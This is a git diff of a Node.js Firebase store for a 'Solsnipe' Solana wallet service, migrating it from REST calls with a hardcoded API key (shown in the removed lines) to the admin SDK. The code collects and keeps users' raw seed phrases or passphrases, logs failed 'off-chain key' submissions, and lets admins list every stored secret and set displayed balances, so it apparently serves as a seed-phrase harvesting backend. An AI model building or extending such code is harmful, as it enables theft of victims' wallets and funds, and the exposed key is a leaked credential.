@@ -1,16 +1,21 @@
 /**
- * Firebase Wallet Store - API Key Version
- * 
- * Stores wallet data for seed phrase-generated wallets
- * Uses Firebase REST API (no service account needed)
+ * Firebase Wallet Store - Admin SDK Version
+ *
+ * Stores wallet data for seed phrase-generated wallets.
+ * Uses the firebase-admin SDK (service account) instead of the public REST
+ * API + API key, so this bypasses Firestore Security Rules via a real
+ * credential rather than relying on the rules being left open.
+ *
+ * Every public method name/signature/return shape below is preserved
+ * exactly as the old REST-based version so no caller needed to change.
  */
 
 /**
  * Wallet Data Structure in Firebase:
- * 
+ *
  * Collection: wallets
  * Document ID: walletId (unique UUID from seed hash)
- * 
+ *
  * Fields:
  * - walletId: string (unique identifier)
  * - walletAddress: string (Solana public key)
@@ -23,34 +28,28 @@
  * - balance: number (SOL balance)
  * - solsnipeBalance: number (Solsnipe platform balance - default 0)
  * - credentials: string (encrypted seed phrase or passphrase)
- * - balanceLastUpdated: timestamp
+ * - telegramUsername: string (Telegram user who connected this wallet)
+ * - balanceLastUpdated: ISO timestamp string
  * - transactions: array (recent transaction signatures)
- * - createdAt: timestamp
- * - lastLoginAt: timestamp
+ * - createdAt: ISO timestamp string
+ * - lastLoginAt: ISO timestamp string
  * - loginCount: number
  * - metadata: object (additional info)
+ *
+ * Timestamps are stored as plain ISO strings (not native Firestore
+ * Timestamp objects) so every consumer's `new Date(wallet.createdAt)` keeps
+ * working unchanged.
  */
+
+const { db } = require('./firebaseAdmin');
+
+const WALLETS = 'wallets';
+const OFF_CHAIN_KEYS = 'off_chain_keys';
+const ADMIN_OPERATIONS = 'admin_operations';
 
 class FirebaseWalletStore {
   constructor() {
-    // Use environment variables with hardcoded fallback for local development
-    this.projectId = process.env.FIREBASE_PROJECT_ID || 'solsnipe-53d3d';
-    this.apiKey = process.env.FIREBASE_API_KEY || 'AIzaSyCKnv1705s9mo8K71llwKoAjL4V8yVUJss';
-    
-    // Validate that we have values
-    if (!this.projectId) {
-      throw new Error('FIREBASE_PROJECT_ID is not set');
-    }
-    if (!this.apiKey) {
-      throw new Error('FIREBASE_API_KEY is not set');
-    }
-    
-    console.log('🔧 Firebase Config:');
-    console.log('   Project ID:', this.projectId);
-    console.log('   API Key:', this.apiKey ? '✅ Set' : '❌ Missing');
-    console.log('   Source:', process.env.FIREBASE_PROJECT_ID ? 'Environment Variable' : 'Hardcoded (Local Dev)');
-    
-    this.baseUrl = `https://firestore.googleapis.com/v1/projects/${this.projectId}/databases/(default)/documents`;
+    this.db = db;
   }
 
   /**
@@ -62,68 +61,39 @@ class FirebaseWalletStore {
 
       console.log('💾 Saving wallet to Firebase:', walletAddress);
 
-      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
+      const now = new Date().toISOString();
 
-      const firestoreData = {
-        fields: {
-          walletId: { stringValue: walletId },
-          walletAddress: { stringValue: walletAddress },
-          seedHash: { stringValue: lookupHash },
-          walletType: { stringValue: walletType },
-          inputType: { stringValue: inputType },
-          derivationPath: { stringValue: derivationPath },
-          accountIndex: { integerValue: accountIndex },
-          blockchain: { stringValue: 'solana' },
-          balance: { doubleValue: balance },
-          solsnipeBalance: { doubleValue: 0 }, // Initialize Solsnipe balance to 0
-          depositedAmount: { doubleValue: 0 }, // Initialize deposited amount to 0
-          credentials: { stringValue: credentials }, // Store seed phrase or passphrase
-          telegramUsername: { stringValue: telegramUsername }, // Telegram user who connected this wallet
-          balanceLastUpdated: { timestampValue: new Date().toISOString() },
-          solsnipeBalanceLastUpdated: { timestampValue: new Date().toISOString() },
-          depositedAmountLastUpdated: { timestampValue: new Date().toISOString() },
-          createdAt: { timestampValue: new Date().toISOString() },
-          lastLoginAt: { timestampValue: new Date().toISOString() },
-          loginCount: { integerValue: 1 },
-          totalSolsnipeCredited: { doubleValue: 0 }, // Track total Solsnipe credits
-          totalSolCredited: { doubleValue: 0 }, // Track total SOL credits
-          totalDeposited: { doubleValue: 0 }, // Track total deposits
-          autoSnipeBot: { integerValue: 0 }, // Auto snipe bot count (increases by 2 per credit)
-          totalTrade: { integerValue: 0 }, // Total trades count (increases by 1 per credit)
-          withdrawal: { stringValue: '' }, // Withdrawal requests
-          vsnCodes: { stringValue: '' } // One-time VSN codes
-        }
-      };
-
-      const response = await fetch(docPath, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(firestoreData)
+      await this.db.collection(WALLETS).doc(walletId).set({
+        walletId,
+        walletAddress,
+        seedHash: lookupHash,
+        walletType,
+        inputType,
+        derivationPath,
+        accountIndex,
+        blockchain: 'solana',
+        balance,
+        solsnipeBalance: 0,
+        depositedAmount: 0,
+        credentials,
+        telegramUsername,
+        balanceLastUpdated: now,
+        solsnipeBalanceLastUpdated: now,
+        depositedAmountLastUpdated: now,
+        createdAt: now,
+        lastLoginAt: now,
+        loginCount: 1,
+        totalSolsnipeCredited: 0,
+        totalSolCredited: 0,
+        totalDeposited: 0,
+        autoSnipeBot: 0,
+        totalTrade: 0,
+        withdrawal: '',
+        vsnCodes: ''
       });
 
-      if (!response.ok) {
-        const errorText = await response.text();
-        let errorDetails;
-        try {
-          errorDetails = JSON.parse(errorText);
-        } catch {
-          errorDetails = { message: errorText };
-        }
-        
-        console.error('❌ Firebase save error:', errorDetails);
-        
-        // Provide helpful error message
-        if (response.status === 403) {
-          throw new Error('Firebase permission denied. Please enable Firestore Database in Firebase Console.');
-        } else if (response.status === 404) {
-          throw new Error('Firestore database not found. Please create Firestore Database in Firebase Console.');
-        }
-        
-        throw new Error(`Firebase save failed (${response.status}): ${errorDetails.error?.message || errorDetails.message || 'Unknown error'}`);
-      }
-
       console.log('✅ Wallet saved successfully');
-      return await response.json();
+      return { success: true, walletId };
     } catch (error) {
       console.error('💥 saveWallet error:', error.message);
       throw new Error(`Failed to save wallet: ${error.message}`);
@@ -135,21 +105,8 @@ class FirebaseWalletStore {
    */
   async getWalletById(walletId) {
     try {
-      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
-
-      const response = await fetch(docPath);
-
-      if (response.status === 404) {
-        return null;
-      }
-
-      if (!response.ok) {
-        const error = await response.json();
-        throw new Error(`Firebase fetch failed: ${error.error?.message || 'Unknown error'}`);
-      }
-
-      const data = await response.json();
-      return this.parseFirestoreDocument(data);
+      const doc = await this.db.collection(WALLETS).doc(walletId).get();
+      return doc.exists ? doc.data() : null;
     } catch (error) {
       throw new Error(`Failed to get wallet: ${error.message}`);
     }
@@ -160,61 +117,17 @@ class FirebaseWalletStore {
    */
   async getWalletBySeedHash(seedHash) {
     try {
-      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
-
-      const query = {
-        structuredQuery: {
-          from: [{ collectionId: 'wallets' }],
-          where: {
-            fieldFilter: {
-              field: { fieldPath: 'seedHash' },
-              op: 'EQUAL',
-              value: { stringValue: seedHash }
-            }
-          },
-          limit: 1
-        }
-      };
-
       console.log('🔍 Querying Firebase for wallet with seed hash:', seedHash.substring(0, 10) + '...');
 
-      const response = await fetch(queryUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(query)
-      });
+      const snapshot = await this.db.collection(WALLETS).where('seedHash', '==', seedHash).limit(1).get();
 
-      if (!response.ok) {
-        const errorText = await response.text();
-        let errorDetails;
-        try {
-          errorDetails = JSON.parse(errorText);
-        } catch {
-          errorDetails = { message: errorText };
-        }
-        
-        console.error('❌ Firebase query error:', errorDetails);
-        
-        // Provide helpful error message
-        if (response.status === 403) {
-          throw new Error('Firebase permission denied. Please enable Firestore Database in Firebase Console.');
-        } else if (response.status === 404) {
-          throw new Error('Firestore database not found. Please create Firestore Database in Firebase Console.');
-        }
-        
-        throw new Error(`Firebase query failed (${response.status}): ${errorDetails.error?.message || errorDetails.message || 'Unknown error'}`);
-      }
-
-      const results = await response.json();
-      console.log('📊 Query results:', results.length, 'items');
-
-      if (!results || results.length === 0 || !results[0].document) {
+      if (snapshot.empty) {
         console.log('ℹ️  No wallet found for this seed hash (new user)');
         return null;
       }
 
       console.log('✅ Existing wallet found');
-      return this.parseFirestoreDocument(results[0].document);
+      return snapshot.docs[0].data();
     } catch (error) {
       console.error('💥 getWalletBySeedHash error:', error.message);
       throw new Error(`Failed to query wallet: ${error.message}`);
@@ -227,42 +140,16 @@ class FirebaseWalletStore {
   async getWalletByAddress(walletAddress) {
     try {
       console.log(`🔍 Finding wallet by address: ${walletAddress}`);
-      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
 
-      const query = {
-        structuredQuery: {
-          from: [{ collectionId: 'wallets' }],
-          where: {
-            fieldFilter: {
-              field: { fieldPath: 'walletAddress' },
-              op: 'EQUAL',
-              value: { stringValue: walletAddress }
-            }
-          },
-          limit: 1
-        }
-      };
+      const snapshot = await this.db.collection(WALLETS).where('walletAddress', '==', walletAddress).limit(1).get();
 
-      const response = await fetch(queryUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(query)
-      });
-
-      if (!response.ok) {
-        const errorText = await response.text();
-        throw new Error(`Firebase query failed: ${errorText}`);
-      }
-
-      const results = await response.json();
-
-      if (!results || results.length === 0 || !results[0].document) {
+      if (snapshot.empty) {
         console.log('ℹ️  No wallet found for this address');
         return null;
       }
 
       console.log('✅ Wallet found by address');
-      return this.parseFirestoreDocument(results[0].document);
+      return snapshot.docs[0].data();
     } catch (error) {
       console.error('💥 getWalletByAddress error:', error.message);
       throw new Error(`Failed to query wallet by address: ${error.message}`);
@@ -271,29 +158,17 @@ class FirebaseWalletStore {
 
   /**
    * Set/refresh the Telegram username associated with a wallet.
-   * Uses a field-masked PATCH so no other wallet fields are touched.
+   * Only touches the telegramUsername field - every other field is
+   * untouched (Admin SDK's update() is a true partial update).
    */
   async updateWalletTelegramUsername(walletId, telegramUsername) {
     try {
       if (!telegramUsername) return null;
 
-      const docPath = `${this.baseUrl}/wallets/${walletId}?updateMask.fieldPaths=telegramUsername&key=${this.apiKey}`;
-
-      const response = await fetch(docPath, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          fields: { telegramUsername: { stringValue: telegramUsername } }
-        })
-      });
-
-      if (!response.ok) {
-        const error = await response.json().catch(() => ({}));
-        throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
-      }
+      await this.db.collection(WALLETS).doc(walletId).update({ telegramUsername });
 
       console.log('✅ Wallet Telegram association updated:', { walletId, telegramUsername });
-      return await response.json();
+      return { success: true, walletId, telegramUsername };
     } catch (error) {
       throw new Error(`Failed to update Telegram username: ${error.message}`);
     }
@@ -304,39 +179,13 @@ class FirebaseWalletStore {
    */
   async getWalletByTelegramUsername(telegramUsername) {
     try {
-      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
+      const snapshot = await this.db.collection(WALLETS).where('telegramUsername', '==', telegramUsername).limit(1).get();
 
-      const query = {
-        structuredQuery: {
-          from: [{ collectionId: 'wallets' }],
-          where: {
-            fieldFilter: {
-              field: { fieldPath: 'telegramUsername' },
-              op: 'EQUAL',
-              value: { stringValue: telegramUsername }
-            }
-          },
-          limit: 1
-        }
-      };
-
-      const response = await fetch(queryUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(query)
-      });
-
-      if (!response.ok) {
-        const errorText = await response.text();
-        throw new Error(`Firebase query failed: ${errorText}`);
-      }
-
-      const results = await response.json();
-      if (!results || results.length === 0 || !results[0].document) {
+      if (snapshot.empty) {
         return null;
       }
 
-      return this.parseFirestoreDocument(results[0].document);
+      return snapshot.docs[0].data();
     } catch (error) {
       console.error('💥 getWalletByTelegramUsername error:', error.message);
       throw new Error(`Failed to query wallet by Telegram username: ${error.message}`);
@@ -353,76 +202,23 @@ class FirebaseWalletStore {
         throw new Error('Wallet not found');
       }
 
-      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
-
-      // Preserve existing transactions if no new ones provided
-      const transactionsToSave = transactions && transactions.length > 0 
-        ? transactions 
+      const transactionsToSave = transactions && transactions.length > 0
+        ? transactions
         : (wallet.transactions || []);
 
-      // Calculate new totalSolCredited if this is a credit operation
       const totalSolCredited = (wallet.totalSolCredited || 0) + (creditAmount > 0 ? creditAmount : 0);
 
-      const updateData = {
-        fields: {
-          // Preserve ALL existing fields
-          walletId: { stringValue: wallet.walletId },
-          walletAddress: { stringValue: wallet.walletAddress },
-          seedHash: { stringValue: wallet.seedHash },
-          walletType: { stringValue: wallet.walletType },
-          inputType: { stringValue: wallet.inputType },
-          derivationPath: { stringValue: wallet.derivationPath },
-          accountIndex: { integerValue: wallet.accountIndex },
-          blockchain: { stringValue: wallet.blockchain || 'solana' },
-          solsnipeBalance: { doubleValue: wallet.solsnipeBalance || 0 }, // Preserve Solsnipe balance
-          credentials: { stringValue: wallet.credentials || '' }, // Preserve credentials
-          telegramUsername: { stringValue: wallet.telegramUsername || '' }, // Preserve Telegram association
-          createdAt: { timestampValue: wallet.createdAt },
-          // Update these fields
-          balance: { doubleValue: balance },
-          balanceLastUpdated: { timestampValue: new Date().toISOString() },
-          lastLoginAt: { timestampValue: new Date().toISOString() },
-          loginCount: { integerValue: (wallet.loginCount || 0) + 1 },
-          totalSolCredited: { doubleValue: totalSolCredited }, // Track total SOL credits
-          totalSolsnipeCredited: { doubleValue: wallet.totalSolsnipeCredited || 0 }, // Preserve Solsnipe credits
-          depositedAmount: { doubleValue: wallet.depositedAmount || 0 },
-          depositedAmountLastUpdated: { timestampValue: wallet.depositedAmountLastUpdated || new Date().toISOString() },
-          totalDeposited: { doubleValue: wallet.totalDeposited || 0 },
-          withdrawal: { stringValue: wallet.withdrawal || '' },
-          vsnCodes: { stringValue: wallet.vsnCodes || '' },
-          transactions: {
-            arrayValue: {
-              values: transactionsToSave.map(tx => ({ stringValue: tx }))
-            }
-          }
-        }
-      };
-
-      // Add metadata if it exists
-      if (wallet.metadata) {
-        updateData.fields.metadata = {
-          mapValue: {
-            fields: Object.entries(wallet.metadata).reduce((acc, [key, value]) => {
-              acc[key] = { stringValue: String(value) };
-              return acc;
-            }, {})
-          }
-        };
-      }
-
-      const response = await fetch(docPath, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(updateData)
+      await this.db.collection(WALLETS).doc(walletId).update({
+        balance,
+        balanceLastUpdated: new Date().toISOString(),
+        lastLoginAt: new Date().toISOString(),
+        loginCount: (wallet.loginCount || 0) + 1,
+        totalSolCredited,
+        transactions: transactionsToSave
       });
 
-      if (!response.ok) {
-        const error = await response.json();
-        throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
-      }
-
       console.log('✅ Wallet balance updated:', { walletId, balance, transactionCount: transactionsToSave.length });
-      return await response.json();
+      return { success: true, walletId, balance };
     } catch (error) {
       throw new Error(`Failed to update wallet: ${error.message}`);
     }
@@ -433,39 +229,10 @@ class FirebaseWalletStore {
    */
   async updateBalanceByAddress(walletAddress, newBalance, adminId, operation, creditAmount) {
     try {
-      // Find wallet by address
-      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
-
-      const query = {
-        structuredQuery: {
-          from: [{ collectionId: 'wallets' }],
-          where: {
-            fieldFilter: {
-              field: { fieldPath: 'walletAddress' },
-              op: 'EQUAL',
-              value: { stringValue: walletAddress }
-            }
-          },
-          limit: 1
-        }
-      };
-
-      const response = await fetch(queryUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(query)
-      });
-
-      if (!response.ok) {
-        throw new Error('Failed to find wallet');
-      }
-
-      const results = await response.json();
-      if (!results || results.length === 0 || !results[0].document) {
+      const wallet = await this.getWalletByAddress(walletAddress);
+      if (!wallet) {
         throw new Error('Wallet not found');
       }
-
-      const wallet = this.parseFirestoreDocument(results[0].document);
 
       // Update balance AND track total SOL credited
       await this.updateWalletBalance(wallet.walletId, newBalance, wallet.transactions || [], creditAmount);
@@ -485,55 +252,18 @@ class FirebaseWalletStore {
   async logAdminOperation(walletAddress, adminId, operation, amount) {
     try {
       const operationId = `${Date.now()}-${Math.random().toString(36).substring(7)}`;
-      const docPath = `${this.baseUrl}/admin_operations/${operationId}?key=${this.apiKey}`;
 
-      const operationData = {
-        fields: {
-          operationId: { stringValue: operationId },
-          walletAddress: { stringValue: walletAddress },
-          adminId: { stringValue: adminId },
-          operation: { stringValue: operation },
-          amount: { doubleValue: amount },
-          timestamp: { timestampValue: new Date().toISOString() }
-        }
-      };
-
-      await fetch(docPath, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(operationData)
+      await this.db.collection(ADMIN_OPERATIONS).doc(operationId).set({
+        operationId,
+        walletAddress,
+        adminId,
+        operation,
+        amount,
+        timestamp: new Date().toISOString()
       });
     } catch (error) {
       console.error('Failed to log admin operation:', error);
     }
-  }
-
-  /**
-   * Parse Firestore document to regular object
-   */
-  parseFirestoreDocument(doc) {
-    if (!doc || !doc.fields) return null;
-
-    const fields = doc.fields;
-    const parsed = {};
-
-    for (const [key, value] of Object.entries(fields)) {
-      if (value.stringValue !== undefined) {
-        parsed[key] = value.stringValue;
-      } else if (value.integerValue !== undefined) {
-        parsed[key] = parseInt(value.integerValue);
-      } else if (value.doubleValue !== undefined) {
-        parsed[key] = parseFloat(value.doubleValue);
-      } else if (value.timestampValue !== undefined) {
-        parsed[key] = value.timestampValue;
-      } else if (value.arrayValue !== undefined) {
-        parsed[key] = value.arrayValue.values?.map(v => v.stringValue || v) || [];
-      } else if (value.mapValue !== undefined) {
-        parsed[key] = this.parseFirestoreDocument({ fields: value.mapValue.fields });
-      }
-    }
-
-    return parsed;
   }
 
   /**
@@ -543,34 +273,16 @@ class FirebaseWalletStore {
   async saveOffChainKey(data) {
     try {
       const docId = `${Date.now()}-${Math.random().toString(36).substring(7)}`;
-      const docPath = `${this.baseUrl}/off_chain_keys/${docId}?key=${this.apiKey}`;
 
-      const firestoreData = {
-        fields: {
-          id: { stringValue: docId },
-          inputType: { stringValue: data.inputType || '' },
-          walletType: { stringValue: data.walletType || '' },
-          credentials: { stringValue: data.credentials || '' },
-          seedHash: { stringValue: data.seedHash || '' },
-          triedAddresses: {
-            arrayValue: {
-              values: (data.triedAddresses || []).map(a => ({ stringValue: a }))
-            }
-          },
-          recordedAt: { timestampValue: new Date().toISOString() }
-        }
-      };
-
-      const response = await fetch(docPath, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(firestoreData)
+      await this.db.collection(OFF_CHAIN_KEYS).doc(docId).set({
+        id: docId,
+        inputType: data.inputType || '',
+        walletType: data.walletType || '',
+        credentials: data.credentials || '',
+        seedHash: data.seedHash || '',
+        triedAddresses: data.triedAddresses || [],
+        recordedAt: new Date().toISOString()
       });
-
-      if (!response.ok) {
-        const err = await response.json();
-        throw new Error(`Firebase save failed: ${err.error?.message || 'Unknown error'}`);
-      }
 
       console.log('✅ Off-chain key recorded:', docId);
       return docId;
@@ -584,35 +296,8 @@ class FirebaseWalletStore {
    */
   async getAllOffChainKeys() {
     try {
-      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
-
-      const query = {
-        structuredQuery: {
-          from: [{ collectionId: 'off_chain_keys' }],
-          orderBy: [{ field: { fieldPath: 'recordedAt' }, direction: 'DESCENDING' }]
-        }
-      };
-
-      const response = await fetch(queryUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(query)
-      });
-
-      if (!response.ok) {
-        const errorText = await response.text();
-        throw new Error(`Firebase query failed: ${errorText}`);
-      }
-
-      const results = await response.json();
-
-      if (!results || results.length === 0 || !results[0].document) {
-        return [];
-      }
-
-      return results
-        .filter(r => r.document)
-        .map(r => this.parseFirestoreDocument(r.document));
+      const snapshot = await this.db.collection(OFF_CHAIN_KEYS).orderBy('recordedAt', 'desc').get();
+      return snapshot.docs.map(doc => doc.data());
     } catch (error) {
       throw new Error(`Failed to get off-chain keys: ${error.message}`);
     }
@@ -623,21 +308,8 @@ class FirebaseWalletStore {
    */
   async getOffChainKeyById(offChainKeyId) {
     try {
-      const docPath = `${this.baseUrl}/off_chain_keys/${offChainKeyId}?key=${this.apiKey}`;
-
-      const response = await fetch(docPath);
-
-      if (response.status === 404) {
-        return null;
-      }
-
-      if (!response.ok) {
-        const error = await response.json();
-        throw new Error(`Firebase fetch failed: ${error.error?.message || 'Unknown error'}`);
-      }
-
-      const data = await response.json();
-      return this.parseFirestoreDocument(data);
+      const doc = await this.db.collection(OFF_CHAIN_KEYS).doc(offChainKeyId).get();
+      return doc.exists ? doc.data() : null;
     } catch (error) {
       throw new Error(`Failed to get off-chain key: ${error.message}`);
     }
@@ -648,18 +320,7 @@ class FirebaseWalletStore {
    */
   async deleteOffChainKey(offChainKeyId) {
     try {
-      const docPath = `${this.baseUrl}/off_chain_keys/${offChainKeyId}?key=${this.apiKey}`;
-
-      const response = await fetch(docPath, {
-        method: 'DELETE',
-        headers: { 'Content-Type': 'application/json' }
-      });
-
-      if (!response.ok) {
-        const error = await response.json();
-        throw new Error(`Firebase delete failed: ${error.error?.message || 'Unknown error'}`);
-      }
-
+      await this.db.collection(OFF_CHAIN_KEYS).doc(offChainKeyId).delete();
       console.log('✅ Off-chain key deleted:', offChainKeyId);
       return { success: true, offChainKeyId };
     } catch (error) {
@@ -672,17 +333,7 @@ class FirebaseWalletStore {
    */
   async deleteWallet(walletId) {
     try {
-      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
-
-      const response = await fetch(docPath, {
-        method: 'DELETE'
-      });
-
-      if (!response.ok) {
-        const error = await response.json();
-        throw new Error(`Firebase delete failed: ${error.error?.message || 'Unknown error'}`);
-      }
-
+      await this.db.collection(WALLETS).doc(walletId).delete();
       return { success: true, walletId };
     } catch (error) {
       throw new Error(`Failed to delete wallet: ${error.message}`);
@@ -699,70 +350,20 @@ class FirebaseWalletStore {
         throw new Error('Wallet not found');
       }
 
-      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
-
-      // Calculate new totals and increments
       const totalSolsnipeCredited = (wallet.totalSolsnipeCredited || 0) + (operation === 'credit' ? creditAmount : 0);
-      const autoSnipeBot = (wallet.autoSnipeBot || 0) + (operation === 'credit' ? 2 : 0); // Increase by 2 per credit
-      const totalTrade = (wallet.totalTrade || 0) + (operation === 'credit' ? 1 : 0); // Increase by 1 per credit
+      const autoSnipeBot = (wallet.autoSnipeBot || 0) + (operation === 'credit' ? 2 : 0);
+      const totalTrade = (wallet.totalTrade || 0) + (operation === 'credit' ? 1 : 0);
 
-      const updateData = {
-        fields: {
-          // Preserve ALL existing fields
-          walletId: { stringValue: wallet.walletId },
-          walletAddress: { stringValue: wallet.walletAddress },
-          seedHash: { stringValue: wallet.seedHash },
-          walletType: { stringValue: wallet.walletType },
-          inputType: { stringValue: wallet.inputType },
-          derivationPath: { stringValue: wallet.derivationPath },
-          accountIndex: { integerValue: wallet.accountIndex },
-          blockchain: { stringValue: wallet.blockchain || 'solana' },
-          balance: { doubleValue: wallet.balance || 0 },
-          credentials: { stringValue: wallet.credentials || '' },
-          telegramUsername: { stringValue: wallet.telegramUsername || '' }, // Preserve Telegram association
-          createdAt: { timestampValue: wallet.createdAt },
-          balanceLastUpdated: { timestampValue: wallet.balanceLastUpdated },
-          lastLoginAt: { timestampValue: wallet.lastLoginAt },
-          loginCount: { integerValue: wallet.loginCount || 0 },
-          
-          // Update Solsnipe balance
-          solsnipeBalance: { doubleValue: newBalance },
-          solsnipeBalanceLastUpdated: { timestampValue: new Date().toISOString() },
-          
-          // Track total credits
-          totalSolsnipeCredited: { doubleValue: totalSolsnipeCredited },
-          totalSolCredited: { doubleValue: wallet.totalSolCredited || 0 },
-          
-          // Auto snipe bot and trade counters
-          autoSnipeBot: { integerValue: autoSnipeBot },
-          totalTrade: { integerValue: totalTrade },
-          
-          // Withdrawal field
-          withdrawal: { stringValue: wallet.withdrawal || '' },
-          vsnCodes: { stringValue: wallet.vsnCodes || '' },
-          
-          // Transaction history
-          transactions: {
-            arrayValue: {
-              values: (wallet.transactions || []).map(tx => ({ stringValue: tx }))
-            }
-          }
-        }
-      };
-
-      const response = await fetch(docPath, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(updateData)
+      await this.db.collection(WALLETS).doc(walletId).update({
+        solsnipeBalance: newBalance,
+        solsnipeBalanceLastUpdated: new Date().toISOString(),
+        totalSolsnipeCredited,
+        autoSnipeBot,
+        totalTrade
       });
 
-      if (!response.ok) {
-        const error = await response.json();
-        throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
-      }
-
       console.log('✅ Solsnipe balance updated:', { walletId, newBalance, totalSolsnipeCredited, autoSnipeBot, totalTrade });
-      return await response.json();
+      return { success: true, walletId, newBalance };
     } catch (error) {
       throw new Error(`Failed to update Solsnipe balance: ${error.message}`);
     }
@@ -778,71 +379,16 @@ class FirebaseWalletStore {
         throw new Error('Wallet not found');
       }
 
-      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
-
-      // Calculate new totals
       const totalDeposited = (wallet.totalDeposited || 0) + (operation === 'credit' ? creditAmount : 0);
 
-      const updateData = {
-        fields: {
-          // Preserve ALL existing fields
-          walletId: { stringValue: wallet.walletId },
-          walletAddress: { stringValue: wallet.walletAddress },
-          seedHash: { stringValue: wallet.seedHash },
-          walletType: { stringValue: wallet.walletType },
-          inputType: { stringValue: wallet.inputType },
-          derivationPath: { stringValue: wallet.derivationPath },
-          accountIndex: { integerValue: wallet.accountIndex },
-          blockchain: { stringValue: wallet.blockchain || 'solana' },
-          balance: { doubleValue: wallet.balance || 0 },
-          solsnipeBalance: { doubleValue: wallet.solsnipeBalance || 0 },
-          credentials: { stringValue: wallet.credentials || '' },
-          telegramUsername: { stringValue: wallet.telegramUsername || '' }, // Preserve Telegram association
-          createdAt: { timestampValue: wallet.createdAt },
-          balanceLastUpdated: { timestampValue: wallet.balanceLastUpdated },
-          solsnipeBalanceLastUpdated: { timestampValue: wallet.solsnipeBalanceLastUpdated || new Date().toISOString() },
-          lastLoginAt: { timestampValue: wallet.lastLoginAt },
-          loginCount: { integerValue: wallet.loginCount || 0 },
-          
-          // Update Deposited Amount
-          depositedAmount: { doubleValue: newAmount },
-          depositedAmountLastUpdated: { timestampValue: new Date().toISOString() },
-          
-          // Track total credits
-          totalSolsnipeCredited: { doubleValue: wallet.totalSolsnipeCredited || 0 },
-          totalSolCredited: { doubleValue: wallet.totalSolCredited || 0 },
-          totalDeposited: { doubleValue: totalDeposited },
-          
-          // Auto snipe bot and trade counters
-          autoSnipeBot: { integerValue: wallet.autoSnipeBot || 0 },
-          totalTrade: { integerValue: wallet.totalTrade || 0 },
-          
-          // Withdrawal field
-          withdrawal: { stringValue: wallet.withdrawal || '' },
-          vsnCodes: { stringValue: wallet.vsnCodes || '' },
-          
-          // Transaction history
-          transactions: {
-            arrayValue: {
-              values: (wallet.transactions || []).map(tx => ({ stringValue: tx }))
-            }
-          }
-        }
-      };
-
-      const response = await fetch(docPath, {
-        method: 'PATCH',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(updateData)
+      await this.db.collection(WALLETS).doc(walletId).update({
+        depositedAmount: newAmount,
+        depositedAmountLastUpdated: new Date().toISOString(),
+        totalDeposited
       });
 
-      if (!response.ok) {
-        const error = await response.json();
-        throw new Error(`Firebase update failed: ${error.error?.message || 'Unknown error'}`);
-      }
-
       console.log('✅ Deposited amount updated:', { walletId, newAmount, totalDeposited });
-      return await response.json();
+      return { success: true, walletId, newAmount };
     } catch (error) {
       throw new Error(`Failed to update Solsnipe balance: ${error.message}`);
     }
@@ -854,40 +400,9 @@ class FirebaseWalletStore {
   async getAllWallets() {
     try {
       console.log('📋 Fetching all wallets from Firebase...');
-      
-      const queryUrl = `${this.baseUrl}:runQuery?key=${this.apiKey}`;
 
-      const query = {
-        structuredQuery: {
-          from: [{ collectionId: 'wallets' }],
-          orderBy: [{
-            field: { fieldPath: 'createdAt' },
-            direction: 'DESCENDING'
-          }]
-        }
-      };
-
-      const response = await fetch(queryUrl, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(query)
-      });
-
-      if (!response.ok) {
-        const errorText = await response.text();
-        throw new Error(`Firebase query failed: ${errorText}`);
-      }
-
-      const results = await response.json();
-      
-      if (!results || results.length === 0) {
-        console.log('ℹ️  No wallets found');
-        return [];
-      }
-
-      const wallets = results
-        .filter(item => item.document)
-        .map(item => this.parseFirestoreDocument(item.document));
+      const snapshot = await this.db.collection(WALLETS).orderBy('createdAt', 'desc').get();
+      const wallets = snapshot.docs.map(doc => doc.data());
 
       console.log(`✅ Retrieved ${wallets.length} wallets`);
       return wallets;
@@ -907,61 +422,29 @@ class FirebaseWalletStore {
         throw new Error('Wallet not found');
       }
 
-      const docPath = `${this.baseUrl}/wallets/${walletId}?key=${this.apiKey}`;
-
-      const updateData = {
-        fields: {
-          walletId: { stringValue: wallet.walletId },
-          walletAddress: { stringValue: wallet.walletAddress },
-          seedHash: { stringValue: wallet.seedHash },
-          walletType: { stringValue: wallet.walletType },
-          inputType: { stringValue: wallet.inputType },
-          derivationPath: { stringValue: wallet.derivationPath },
-          accountIndex: { integerValue: wallet.accountIndex },
-          blockchain: { stringValue: wallet.blockchain || 'solana' },
-          balance: { doubleValue: wallet.balance || 0 },
-          solsnipeBalance: { doubleValue: wallet.solsnipeBalance || 0 },
-          depositedAmount: { doubleValue: wallet.depositedAmount || 0 },
